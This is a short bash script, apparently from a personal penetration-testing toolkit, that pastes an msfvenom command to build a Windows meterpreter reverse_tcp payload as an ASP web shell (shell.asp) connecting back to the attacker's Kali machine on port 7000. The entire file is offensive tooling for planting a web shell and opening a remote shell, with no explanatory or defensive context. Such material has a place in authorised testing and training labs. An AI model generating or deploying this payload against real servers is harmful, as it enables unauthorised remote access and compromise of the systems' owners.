#!/bin/bash

"""
Create ASP file
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=7000 -f asp -o shell.asp"
